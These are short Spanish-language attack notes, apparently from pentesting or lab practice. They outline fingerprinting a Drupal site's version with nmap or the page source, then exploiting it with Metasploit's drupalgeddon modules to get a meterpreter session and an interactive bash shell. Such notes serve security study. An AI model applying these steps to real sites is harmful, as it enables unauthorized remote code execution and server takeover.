Drupal revisar si con el nmap conseguimos la version de drupal

en la pantalla de inicio viendo el codigo fuente podemoss encontrar la version 

atacamos con metasploit msfconsole



search drupal {version}

usaremos el exploit drupalgeddon o drupalgeddon2
show options
RHOST
PORT
LHOST
en RHOST ponemos toda la ruta donde esta el drupal
RUN

meterpreter > shell

bash -i

